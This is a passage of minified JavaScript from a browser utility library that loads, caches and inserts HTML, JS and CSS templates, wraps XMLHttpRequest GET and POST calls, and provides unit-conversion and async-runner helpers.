r=addHTML__URLToElID_Cache(t,n),i=STtwUtilTemplateHTML.addJS__URL_Cache(e,r);return[r,i]},this.addHTMLJS__URLToEl_Return=function(t,e,n){var r=addHTML__URLToEl(t,n),i=STtwUtilTemplateHTML.addJS__URL(e,r);return[r,i]},this.addHTMLJS__URLToEl_Return_Cache=function(t,e,n){var r=addHTML__URLToEl_Cache(t,targetElementID),i=STtwUtilTemplateHTML.addJS__URL_Cache(e,r);return[r,i]},this.addHTMLJSCSS__URL=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToElID(t,r);return STtwUtilTemplateHTML.addJS__URL(e,i),i},this.addHTMLJSCSS__URL_Cache=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToElID_Cache(t,r);return STtwUtilTemplateHTML.addJS__URL_Cache(e,i),i},this.addHTMLJSCSS__URL_Return=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToElID(t,r),a=STtwUtilTemplateHTML.addJS__URL(e,i);return[i,a]},this.addHTMLJSCSS__URL_Return_Cache=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToElID_Cache(t,r),a=STtwUtilTemplateHTML.addJS__URL_Cache(e,i);return[i,a]},this.addHTMLJSCSS__URLToEl_Return=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToEl(t,r),a=STtwUtilTemplateHTML.addJS__URL(e,i);return[i,a]},this.addHTMLJSCSS__URLToEl_Return_Cache=function(t,e,n,r){addCSS__URLToHead(n);var i=addHTML__URLToEl_Cache(t,r),a=STtwUtilTemplateHTML.addJS__URL_Cache(e,i);return[i,a]},this.addHTMLJSCSS__URLFileNM=function(t,e,n,r,i){var a=addHTML__URLToElID(t+e+".html",i);return STtwUtilTemplateHTML.addJS__URL(t+n+".js",a),addCSS__URLToHead(t+r+".css"),a},this.addHTMLJSCSS__URLFileNM_Cache=function(t,e,n,r,i){var a=addHTML__URLToElID_Cache(t+e+".html",i);return STtwUtilTemplateHTML.addJS__URL_Cache(t+n+".js",a),addCSS__URLToHead(t+r+".css"),a},this.addHTMLJSCSS__URLFileNM_Return=function(t,e,n,r,i){var a=addHTML__URLToElID(t+e+".html",i),o=STtwUtilTemplateHTML.addJS__URL(t+n+".js",a);return addCSS__URLToHead(t+r+".css"),[a,o]},this.addHTMLJSCSS__URLFileNM_Return_Cache=function(t,e,n,r,i){var a=addHTML__URLToElID_Cache(t+e+".html",i),o=STtwUtilTemplateHTML.addJS__URL_Cache(t+n+".js",a);return addCSS__URLToHead(t+r+".css"),[a,o]},this.addJS__URL=function(t){return _addJS__URL.apply(null,arguments)},this.addJS__URL.__JSS={};var _addJS__URL_Cache=function(url){if(STtwUtilTemplateHTML.checkCache_JS(url)){var d=_dictionary__addJS[url];return"function"==typeof d?arguments[1]?o.apply(null,arguments):o():eval(d)}var s=reqSyncJS(url),o=eval(s);return"function"==typeof o?(_addCache(_dictionary__addJS,url,o),arguments[1]?o.apply(null,arguments):o()):(_addCache(_dictionary__addJS,url,s),o)};this.addJS__URL_Cache=function(t){return _addJS__URL_Cache.apply(null,arguments)};var replaceHTML__URLToEl=function(t,e,n){var r=arguments.callee.owner.createHTML(reqSyncReturnHTMLText(t));return r.__URL_HTML=t.replace(_regExp_newline0,"").replace(_regExp_space0,"").replace(_regExp_tab0,""),e.replaceChild(r,n),STtwUtilDisObj.mouseEnable(r),r},replaceHTML__URLToEl_Cache=function(t,e,n){STtwUtilTemplateHTML.checkCache_HTML(t)||_addCache(_dictionary__addHTML,t,reqSyncReturnHTMLText(t));var r=arguments.callee.owner.createHTML(_dictionary__addHTML[t]);return r.__URL_HTML=t.replace(_regExp_newline0,"").replace(_regExp_space0,"").replace(_regExp_tab0,""),e.replaceChild(r,n),STtwUtilDisObj.mouseEnable(r),r},replaceHTML__URLToElID=function(t,e,n){return replaceHTML__URLToEl(t,window.document.getElementById(e),window.document.getElementById(n))},replaceHTML__URLToElID_Cache=function(t,e,n){return replaceHTML__URLToEl_Cache(t,window.document.getElementById(e),window.document.getElementById(n))};this.replaceHTMLJS__URL_Return=function(t,e,n){var r=replaceHTML__URLToElID(t,parentElementID,n),i=STtwUtilTemplateHTML.addJS__URL(e,r);return[r,i]},this.replaceHTMLJS__URL_Return_Cache=function(t,e,n){var r=replaceHTML__URLToElID_Cache(t,parentElementID,n),i=STtwUtilTemplateHTML.addJS__URL_Cache(e,r);return[r,i]},this.replaceHTMLJS__URLToEl_Return=function(t,e,n,r){var i=replaceHTML__URLToEl(t,n,r),a=STtwUtilTemplateHTML.addJS__URL(e,i);return[i,a]},this.replaceHTMLJS__URLToEl_Return_Cache=function(t,e,n){var r=replaceHTML__URLToEl_Cache(t,parentElement,targetElementID),i=STtwUtilTemplateHTML.addJS__URL_Cache(e,r);return[r,i]},this.checkCache_CSS=function(t){return _checkCache(_dictionary__addCSS,t)},this.checkCache_HTML=function(t){return _checkCache(_dictionary__addHTML,t)},this.checkCache_JS=function(t){return _checkCache(_dictionary__addJS,t)},this.checkCache_CSS__Alert=function(t){return _checkCache__Alert(_dictionary__addCSS,t,"CSS")},this.checkCache_HTML__Alert=function(t){return _checkCache__Alert(_dictionary__addHTML,t,"HTML")},this.checkCache_JS__Alert=function(t){return _checkCache__Alert(_dictionary__addJS,t,"JS")},this.clear_Cache_All=function(){this.clear_Cache_CSS(),clear_Cache_HTML(),this.clear_Cache_JS()},this.clear_Cache_CSS=function(){Lib.Ttw.destroyObj(_dictionary__addCSS),_dictionary__addCSS={}},this.clear_Cache_HTML=function(){Lib.Ttw.destroyObj(_dictionary__addHTML),_dictionary__addHTML={}},this.clear_Cache_JS=function(){Lib.Ttw.destroyObj(_dictionary__addJS),_dictionary__addJS={}},this.delete_Cache_CSS__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addCSS,t)},this.delete_Cache_HTML__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addHTML,t)},this.delete_Cache_JS__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addJS,t)},this.createCSS_LINK=function(t){var e=document.createElement("LINK");return e.setAttribute("rel","stylesheet"),e.setAttribute("type","text/css"),e.setAttribute("href",t),e};var _createHTML=function(t,e){t=STtwUtilString.includeHTML_Recursion(t),e.innerHTML="",e.insertAdjacentHTML("afterbegin",t);var n=e.children[0];return e.removeChild(n),STtwUtilHTML.importHTML_Recursion(n),STtwUtilHTML.replaceHTML_Recursion(n),n};this.createHTML=function(t){return _createHTML(t,_tempDOM_DIV__Sync)},this.createHTML_LI=function(t){return _createHTML(t,_tempDOM_UL__Sync)},this.createHTML_TBODY=function(t){return _createHTML(t,_tempDOM_TABLE__Sync)},this.createHTML_THEAD=function(t){return _createHTML(t,_tempDOM_TABLE__Sync)},this.createHTML_TR=function(t){return _createHTML(t,_tempDOM_TBODY__Sync)};var _createHTML_STYLE=function(t){var e=document.createElement("style");return e.innerText=t,e};this.createHTML_STYLE=function(t){return _createHTML_STYLE(t)};var createHTML__URL=function(t){return arguments.callee.owner.createHTML(reqSyncReturnHTMLText(t))},createHTML__URL__DelHTMLComment=function(t){return arguments.callee.owner.createHTML(reqSyncReturnHTMLText__DelHTMLComment(t))},reqSyncJS=function(t){try{return STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,t,null).responseText}catch(e){global.TtwLog.error("Error : "+e+"\nurl : "+t)}},reqSyncJSEval=function(url){if(arguments[1])try{var f=eval(STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,url,null).responseText);return STtwUtilTemplateHTML.addJS__URL.__JSS[url]=f,f&&f.apply?f.apply(null,arguments):f}catch(e){global.TtwLog.error("Error : "+e+"\nurl : "+url)}else try{var s=STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,url,null).responseText,o=eval(s);return STtwUtilTemplateHTML.addJS__URL.__JSS[url]=o,"function"==typeof o&&s.length-3==s.lastIndexOf("});")?o(url):o}catch(e){global.TtwLog.error("Error : "+e+"\nurl : "+url)}},reqSyncJSEval__Param=function(url){try{return eval(STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,url,null).responseText).apply(null,arguments)}catch(e){global.TtwLog.error("reqSyncJSEval__Param Error : "+e+"\nurl : "+url)}},reqSyncReturnHTMLDOM=function(t){return arguments.callee.owner.createHTML(STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,t,null).responseText)},_reqSyncReturnHTMLText=function(t){return STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,t,null).responseText},_reqSyncReturnHTMLText__DelHTMLComment=function(t){return STtwUtilXMLHttpReqGetRef.reqSyncReturn(null,t,null).responseText.replace(_reqSyncReturnHTMLText__DelHTMLComment.rE0,"")};_reqSyncReturnHTMLText__DelHTMLComment.rE0=new RegExp(/<![\s\S]*?--[ \t\n\r]*>/gim);var reqSyncReturnHTMLText=null;this.getHTMLElement__URL=function(t){return reqSyncReturnHTMLDOM(t)},this.setMode_CreateHTML__DelHTMLComment=function(){reqSyncReturnHTMLText=_reqSyncReturnHTMLText__DelHTMLComment},this.setMode_CreateHTML__NotHTMLComment=function(){reqSyncReturnHTMLText=_reqSyncReturnHTMLText},this.setMode_CreateHTML__DelHTMLComment(),addCSS__URLToHead.owner=addHTML__URLToEl.owner=addHTML__URLToEl_Cache.owner=this.addJS__URL.owner=replaceHTML__URLToEl.owner=replaceHTML__URLToEl_Cache.owner=reqSyncReturnHTMLDOM.owner=this;var _addJS__URL=reqSyncJSEval;return this.addCSS__URLToHead=addCSS__URLToHead,this.addHTML__URLToEl=addHTML__URLToEl,this.addHTML__URLToEl_Cache=addHTML__URLToEl_Cache,this.addHTML__URLToElID=addHTML__URLToElID,this.addHTML__URLToElID_Cache=addHTML__URLToElID_Cache,this},lt.CLASS.FN.TemplateHTMLAsync=function(d){this.instanceKey=d.instanceKey||"global.Lib.Ttw.fnTemplateHTMLAsync";var t=lt.singleton(d.instanceKey,null);if(t)return t;this["package"]="global.Lib.Ttw.CLASS.FN.TemplateHTMLAsync";var _dictionary__addCSS={},_dictionary__addHTML={},_dictionary__addJS={},_tempDOM_DIV__Sync=window.document.createElement("DIV"),_addCache=function(t,e,n){t[e]=n},_checkCache=function(t,e){return t[e]?!0:!1},_checkCache__Alert=function(t,e,n){var r=_checkCache(t,e,n);return r&&alert(n+" Cache - "+e+" is "+r),r},addHTML__URLToEl=function(t,e,n){var r=STtwUtilTemplateHTML.createHTML;reqReturnHTMLText(t,function(t){var i=r(t);e.appendChild(i),STtwUtilDisObj.mouseEnable(i),n(i)})},addHTML__URLToEl_Cache=function(t,e,n){var r=STtwUtilTemplateHTML.createHTML;STtwUtilTemplateHTML.checkCache_HTML(t)||reqReturnHTMLText(t,function(i){_addCache(_dictionary__addHTML,t,i);var a=r(i);e.appendChild(a),STtwUtilDisObj.mouseEnable(a),n(a)})},addHTML__URLToElID=function(t,e,n){addHTML__URLToEl(t,window.document.getElementById(e),n)},addHTML__URLToElID_Cache=function(t,e,n){addHTML__URLToEl_Cache(t,window.document.getElementById(e),n)};this.addHTMLJS__URL=function(t,e,n){addHTML__URLToElID(t,n,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e)})},this.addHTMLJS__URL_Cache=function(t,e,n){addHTML__URLToElID_Cache(t,n,function(t){STtwUtilTemplateHTMLAsync.addJS__URL_Cache(e)})},this.addHTMLJS__URL_Return=function(t,e,n,r){addHTML__URLToElID(t,n,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){r?r(t,e):null})})},this.addHTMLJS__URL_Return_Cache=function(t,e,n,r){addHTML__URLToElID_Cache(t,n,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){r?r(t,e):null})})},this.addHTMLJSCSS__URL=function(t,e,n,r,i){STtwUtilTemplateHTML.$addCSS__URLToHead(n),addHTML__URLToElID(t,r,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){i?i(t,e):null})})},this.addHTMLJSCSS__URL_Cache=function(t,e,n,r,i){STtwUtilTemplateHTML.$addCSS__URLToHead(n),addHTML__URLToElID_Cache(t,r,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){i?i(t,e):null})})},this.addHTMLJSCSS__URL_Return=function(t,e,n,r,i){STtwUtilTemplateHTML.$addCSS__URLToHead(n),addHTML__URLToElID(t,r,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){i?i(t,e):null})})},this.addHTMLJSCSS__URL_Return_Cache=function(t,e,n,r,i){STtwUtilTemplateHTML.$addCSS__URLToHead(n),addHTML__URLToElID_Cache(t,r,function(t){STtwUtilTemplateHTMLAsync.addJS__URL(e,function(e){i?i(t,e):null})})},this.addHTMLJSCSS__URLFileNM=function(t,e,n,r,i,a){addHTML__URLToElID(t+e+".html",i,function(e){STtwUtilTemplateHTMLAsync.addJS__URL(t+n+".js",function(n){STtwUtilTemplateHTML.$addCSS__URLToHead(t+r+".css"),a?a(e,n):null})})},this.addHTMLJSCSS__URLFileNM_Cache=function(t,e,n,r,i,a){addHTML__URLToElID_Cache(t+e+".html",i,function(e){STtwUtilTemplateHTMLAsync.addJS__URL(t+n+".js",function(n){STtwUtilTemplateHTML.$addCSS__URLToHead(t+r+".css"),a?a(e,n):null})})},this.addHTMLJSCSS__URLFileNM_Return=function(t,e,n,r,i,a){addHTML__URLToElID(t+e+".html",i,function(e){STtwUtilTemplateHTMLAsync.addJS__URL(t+n+".js",function(n){STtwUtilTemplateHTML.$addCSS__URLToHead(t+r+".css"),a?a(e,n):null})})},this.addHTMLJSCSS__URLFileNM_Return_Cache=function(t,e,n,r,i,a){addHTML__URLToElID_Cache(t+e+".html",i,function(e){STtwUtilTemplateHTMLAsync.addJS__URL(t+n+".js",function(n){STtwUtilTemplateHTML.$addCSS__URLToHead(t+r+".css"),a?a(e,n):null})})},this.addJS__URL=function(t,e){_addJS__URL.apply(null,arguments)};var _addJS__URL_Cache=function(url,cb_Complete){if(STtwUtilTemplateHTMLAsync.checkCache_JS(url)){var d=_dictionary__addJS[url];cb_Complete("function"==typeof d?arguments[2]?o.apply(null,arguments):o():eval(d))}else reqJS(url,function(s){var o=eval(s);"function"==typeof o?(_addCache(_dictionary__addJS,url,o),cb_Complete(arguments[2]?o.apply(null,arguments):o())):(_addCache(_dictionary__addJS,url,s),cb_Complete(o))})};this.addJS__URL_Cache=function(t,e){return _addJS__URL_Cache.apply(null,arguments)},this.checkCache_CSS=function(t){return _checkCache(_dictionary__addCSS,t)},this.checkCache_HTML=function(t){return _checkCache(_dictionary__addHTML,t)},this.checkCache_JS=function(t){return _checkCache(_dictionary__addJS,t)},this.checkCache_CSS__Alert=function(t){return _checkCache__Alert(_dictionary__addCSS,t,"CSS")},this.checkCache_HTML__Alert=function(t){return _checkCache__Alert(_dictionary__addHTML,t,"HTML")},this.checkCache_JS__Alert=function(t){return _checkCache__Alert(_dictionary__addJS,t,"JS")},this.clear_Cache_All=function(){this.clear_Cache_CSS(),clear_Cache_HTML(),this.clear_Cache_JS()},this.clear_Cache_CSS=function(){Lib.Ttw.destroyObj(_dictionary__addCSS),_dictionary__addCSS={}},this.clear_Cache_HTML=function(){Lib.Ttw.destroyObj(_dictionary__addHTML),_dictionary__addHTML={}},this.clear_Cache_JS=function(){Lib.Ttw.destroyObj(_dictionary__addJS),_dictionary__addJS={}},this.delete_Cache_CSS__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addCSS,t)},this.delete_Cache_HTML__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addHTML,t)},this.delete_Cache_JS__Key=function(t){Lib.Ttw.destroyKey(_dictionary__addJS,t)};var createHTML__URL=function(t){return arguments.callee.owner.createHTML(reqSyncReturnHTMLText(t))},createHTML__URL__DelHTMLComment=function(t){return arguments.callee.owner.createHTML(reqSyncReturnHTMLText__DelHTMLComment(t))},reqJS=function(t,e){try{STtwUtilXMLHttpReqGet.req_String(t,function(t){e(t)})}catch(n){global.TtwLog.error("Error : "+n)}},reqJSEval=function(url,cb_Complete){if(arguments[2]){var args=arguments;try{STtwUtilXMLHttpReqGet.req_String(url,function(d){cb_Complete?cb_Complete(eval(d).apply(null,args)):eval(d).apply(null,args)})}catch(e){global.TtwLog.error("Error : "+e)}}else try{STtwUtilXMLHttpReqGet.req_String(url,function(d){cb_Complete?cb_Complete(eval(d)):eval(d)})}catch(e){global.TtwLog.error("Error : "+e)}},reqJSEval__Param=function(url){try{return eval(STtwUtilXMLHttpReqGet.reqSyncReturn(url,null).responseText).apply(null,arguments)}catch(e){global.TtwLog.error("Error : "+e)}},reqSyncReturnHTMLDOM=function(t){return arguments.callee.owner.createHTML(STtwUtilXMLHttpReqGet.reqSyncReturn(t,null).responseText)},reqReturnHTMLText=function(t,e){STtwUtilXMLHttpReqGet.req_String(t,function(t){e(t)})},reqReturnHTMLText__DelHTMLComment=function(t,e){STtwUtilXMLHttpReqGet.req_String(t,function(t){e(t.replace(reqSyncReturnHTMLText__DelHTMLComment.rE0,""))})};reqReturnHTMLText__DelHTMLComment.rE0=new RegExp(/<![\s\S]*?--[ \t\n\r]*>/gim),this.getHTMLElement__URL=function(t){return reqSyncReturnHTMLDOM(t)},addHTML__URLToEl.owner=addHTML__URLToEl_Cache.owner=this.addJS__URL.owner=this,this.addHTML__URLToEl=addHTML__URLToEl,this.addHTML__URLToEl_Cache=addHTML__URLToEl_Cache,this.addHTML__URLToElID=addHTML__URLToElID,this.addHTML__URLToElID_Cache=addHTML__URLToElID_Cache;var _addJS__URL=reqJSEval;return this},lt.CLASS.FN.Transform=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnTransform";var e=lt.singleton(t.instanceKey,null);return e?e:void(this["package"]="global.Lib.Ttw.CLASS.FN.Transform")},lt.CLASS.FN.Unit=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnUnit";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.FN.Unit",this.DOTS_PER_INCH=72,this.HASH_MAP_INCHES_PER_UNIT={cm:.393701,mm:.0393701,m:39.3700787,km:39370.0787,degrees:4374754,ft:12,inch:1,mile:63360},this.HASH_MAP_METERS_PER_UNIT={cm:.01,mm:.001,m:1,km:1e3,degrees:111319.4908,foot:.3048,inch:0,mi:0},this.CENTIMETER="cm",this.METER="m",this.MILLIMETER="mm",this.KILOMETER="km",this.SEXAGESIMAL="dms",this.DEGREE="degrees",this.FOOT="ft",this.INCH="inch",this.MILE="mi",this.RADIAN="rad",this.PIXEL_SIZE=28e-5,this.getInchesPerUnit=function(t){return this.HASH_MAP_INCHES_PER_UNIT[t]},this.getMetersPerUnit=function(t){return this.HASH_MAP_METERS_PER_UNIT[t]},this.getResolutionFromScale=function(t,e){e||(e=this.DEGREE);var n=STtwUtilGeom.normalizeScale(t),r=1/(n*this.getInchesPerUnit(e)*this.DOTS_PER_INCH);return r},this.getScaleFromResolution=function(t,e){e||(e=this.DEGREE);var n=t*this.getInchesPerUnit(e)*this.DOTS_PER_INCH;return n},this.getResolutionFromScaleDenominator=function(t,e){return e||(e=this.DEGREE),t*this.PIXEL_SIZE/this.getMetersPerUnit(e)},void(this.getScaleDenominatorFromResolution=function(t,e){return e||(e=this.DEGREE),t*this.getMetersPerUnit(e)/this.PIXEL_SIZE}))},lt.CLASS.FN.XMLHttpRequest_Get=function(){this.instanceKey=d.instanceKey||"global.Lib.Ttw.fnXMLHttpRequest_Get";var t=lt.singleton(d.instanceKey,null);if(t)return t;this["package"]="global.Lib.Ttw.CLASS.FN.XMLHttpRequest_Get";var e=(new XMLHttpRequest,{}),n=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},r=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},i=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},a=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},o=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},l=function(t){arguments.callee.owner},c=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},s=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},u=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},_=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},h=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},f=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},T=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)};this.consoleLog__RequestEvent=function(t){t.target};if("8"==document.documentMode)var L=function(t,e,n){var r=(global.Lib.Ttw.fnXMLHttpRequest_Get,new XMLHttpRequest);return n&&(n.onreadystatechange.e=r,arguments.callee.owner.setXMLHttpRequest__cbFunctions(r,n)),r.open("GET",t,e),r};else var L=function(t,e,n){var r=(global.Lib.Ttw.fnXMLHttpRequest_Get,new XMLHttpRequest);return n&&arguments.callee.owner.setXMLHttpRequest__cbFunctions(r,n),r.open("GET",t,e),r};return this.req=function(t,e){L(t,!0,e).send()},"8"==document.documentMode?this.req_String=function(t,e){L(t,!0,{onreadystatechange:function(){var t=arguments.callee.e;4==t.readyState&&200==t.status&&e(t.responseText)}}).send()}:this.req_String=function(t,e){L(t,!0,{onloadend:function(t){e(t.target.responseText)}}).send()},this.reqSync=function(t,e){L(t,!1,e).send()},this.reqSyncReturn=function(t,e){var n=L(t,!1,e);return n.send(),n},this.reqSyncReturnResponstText__Cache=function(t,n){if(!e[t]){var r=L(t,!1,n);r.send(),e[t]=r.responseText}return e[t]},this.reqSyncReturnResponstText__Cache.ADD_STORE=function(t,n){e[t]=n},this.reqSyncReturnResponstText__Cache.CHECK_STORE=function(t){return e[t]?1:0},this.reqSyncReturnResponstText__Cache.CLEAR_STORE=function(){e={}},this.reqSyncReturnResponstText__Cache.GET_STORE=function(t){return e[t]},this.setXMLHttpRequest__cbFunctions=function(t,e){t.onerror=e.onerror?e.onerror:r,t.onloadend=e.onloadend?e.onloadend:a,t.onreadystatechange=e.onreadystatechange?e.onreadystatechange:null},L.owner=n.owner=r.owner=i.owner=a.owner=o.owner=f.owner=l.owner=c.owner=s.owner=u.owner=_.owner=h.owner=T.owner=this,this},lt.CLASS.FN.XMLHttpRequest_Get_Ref=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnXMLHttpRequest_Get_Ref";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.XMLHttpRequest_Get_Ref";var n=new XMLHttpRequest;if("8"==document.documentMode)var r=function(t,e,r,i){return t=t?t:n,i&&(i.onreadystatechange.e=t,STtwUtilXMLHttpReqGet.setXMLHttpRequest__cbFunctions(t,i)),t.open("GET",e,r),t};else var r=function(t,e,r,i){return t=t?t:n,i&&STtwUtilXMLHttpReqGet.setXMLHttpRequest__cbFunctions(t,i),t.open("GET",e,r),t};return this.req=function(t,e,i){t=t?t:n,r(t,e,!0,i).send()},"8"==document.documentMode?this.req_String=function(t,e,i){t=t?t:n,r(t,e,!0,{onreadystatechange:function(){var t=arguments.callee.e;4==t.readyState&&200==t.status&&i(t.responseText)}}).send()}:(this.req_String=function(t,e,i){t=t?t:n,r(t,e,!0,{onloadend:function(t){i(t.target.responseText)}}).send()},this.req_String._o_cb_Complete={onloadend:function(t){cb_Complete(t.target.responseText)}}),this.reqSync=function(t,e,i){t=t?t:n,r(t,e,!1,i).send()},this.reqSyncReturn=function(t,e,i){t=t?t:n;var t=r(t,e,!1,i);return t.send(),t},r.owner=this,this},lt.CLASS.FN.XMLHttpRequest_Post=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnXMLHttpRequest_Post";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.XMLHttpRequest_Post";var n=(new XMLHttpRequest,function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)}),r=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},i=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},a=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},o=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},l=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},c=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},s=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},u=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},_=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},d=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},h=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)},f=function(t){var e=arguments.callee.owner;e.consoleLog__RequestEvent(t)};this.consoleLog__RequestEvent=function(t){t.target};var T=function(t,e,n){var r=new XMLHttpRequest;r.open("POST",t,e);for(var i in n)r.setRequestHeader(i,n[i]);return r},L=function(t,e,n,r){var i=(global.Lib.Ttw.XMLHttpRequest_Post,new XMLHttpRequest);r&&arguments.callee.owner.setXMLHttpRequest__cbFunctions(i,r),i.open("POST",t,e);for(var a in n)i.setRequestHeader(a,n[a]);return i};return this.req__paramsForm=function(t,e,n,r){L(e.action,!0,n,r).send(e)},this.req__paramsForm_useAction=function(t,e,n){L(t.action,!0,e,n).send(t)},this.req__paramsObj=function(t,e,n,r){var i=new FormData;for(var a in e)i.append(a,e[a]);L(t,!0,n,r).send(i)},this.req__paramsStr=function(t,e,n,r){L(t,!0,n,r).send(e)},this.reqSync__paramsForm=function(t,e,n,r){L(t,!1,n,r).send(new FormData(e))},this.reqSync__paramsForm_useAction=function(t,e,n){L(t.action,!1,e,n).send(new FormData(t))},this.reqSync__paramsObj=function(t,e,n,r){var i=new FormData;for(var a in e)i.append(a,e[a]);L(t,!1,n,r).send(i)},this.reqSync__paramsStr=function(t,e,n){L(t,!1,n,cbFunctions).send(e)},this.reqSyncReturn__paramsForm=function(t,e,n,r){var i=T(t,!1,n,r);return i.send(new FormData(e)),i},this.reqSync__paramsForm_useAction=function(t,e,n){var r=T(t.action,!1,e,n);return r.send(new FormData(t)),r},this.reqSync__paramsObj=function(t,e,n,r){var i=new FormData;for(var a in e)i.append(a,e[a]);var o=T(t,!1,n,r);return o.send(i),o},this.reqSync__paramsStr=function(t,e,n){var r=T(t,!1,n,cbFunctions);return r.send(e),r},this.reqSyncReturn__paramsStr__Ref=function(t,e,n,r){var i;if(t){i=t,i.open("POST",e,!1);for(var a in r)i.setRequestHeader(a,r[a])}else i=T(e,!1,r);return i.send(n),i},this.setXMLHttpRequest__cbFunctions=function(t,e){t.onerror=e.onerror?e.onerror:r,t.onloadend=e.onloadend?e.onloadend:a,t.onreadystatechange=e.onreadystatechange?e.onreadystatechange:l},L.owner=n.owner=r.owner=i.owner=a.owner=o.owner=h.owner=l.owner=c.owner=s.owner=u.owner=_.owner=d.owner=f.owner=this,this},lt.CLASS.Runner.AsyncRuns_SelfAsync=function(t,e){this["package"]="global.Lib.Ttw.CLASS.Runner.AsyncRuns_SelfAsync";var n=!1,r=null,i=null,a=null,o=0,l=0,c=10;return this.idx=0,this.idxLen=0,this.looper=null,this.ttwDestroy=function(){this.destroyLooper(),r=null,i=null,a=null,o=NaN,l=NaN,c=NaN,this.idx=NaN,this.idxLen=NaN},this.evt_Interval=function(){for(var t=(new Date).getTime(),e=t+c,n=arguments.callee;(new Date).getTime()<e;){if(l>o){n.cbParams.length?r.apply(null,n.cbParams):r(),++o;break}n.owner.destroyLooper(),null!=i&&i();break}},this.evt_Interval.owner=this,this.destroyLooper=function(){n=!0,clearInterval(this.looper)},this.run=function(t,e,a,o,s){r=a,i=o,s=s?s:null,l=t,c=e,n=!1,this.looper=setInterval(this.evt_Interval,30),this.evt_Interval.cbParams=s},this},lt.CLASS.Runner.AsyncRuns_SelfSync=function(t){},lt.CLASS.Runner.AsyncRuns_SelfAsync_MultyFN=function(t){},lt.CLASS.Runner.AsyncRuns_SelfSync_MultyFN=function(t){},lt.initialize_Console(),lt.initialize_hasOwnProperty(),delete lt.initialize_Console,delete lt.initialize_hasOwnProperty}();
global.window=global,global.TtwPackageInitialize=function(){var t="TtwPackageInitialize",n=global,e=n.Lib.Ttw,a=e.CLASS,i="global.Lib.Ttw.";e.Error=new a.Error.Error({instanceKey:i+"Error"});var o=a.Event;e.Event=new o.Event({instanceKey:i+"Event"}),n.STtwUtilEvent=e.Event;var r=a.FN;e.fnArray=new r.Array({instanceKey:i+"fnArray"}),e.fnCommon=new r.Common({instanceKey:i+"fnCommon"}),e.fnCustomEvent=new r.CustomEvent({instanceKey:i+"fnCustomEvent"}),e.fnDate=new r.Date({instanceKey:i+"fnDate"}),e.fnGeom=new r.Geometry({instanceKey:i+"fnGeom"}),e.fnHTML=new r.HTML({instanceKey:i+"fnHTML"}),e.fnJSON=new r.JSON({instanceKey:i+"fnJSON"}),e.fnMath=new r.Math({instanceKey:i+"fnMath"}),e.fnObject=new r.Object({instanceKey:i+"fnObject"}),e.fnString=new r.String({instanceKey:i+"fnString"}),e.fnUnit=new r.Unit({instanceKey:i+"fnUnit"}),n.STtwUtilCommon=e.fnCommon,n.STtwUtilCustomEvent=e.fnCustomEvent,n.STtwUtilDate=e.fnDate,n.STtwUtilFile=e.fnFile,n.STtwUtilFlash=e.fnFlash,n.STtwUtilGeom=e.fnGeom,n.STtwUtilHTML=e.fnHTML,n.STtwUtilJSON=e.fnJSON,n.STtwUtilMath=e.fnMath,n.STtwUtilObject=e.fnObject,n.STtwUtilString=e.fnString,n.STtwUtilUnit=e.fnUnit;var 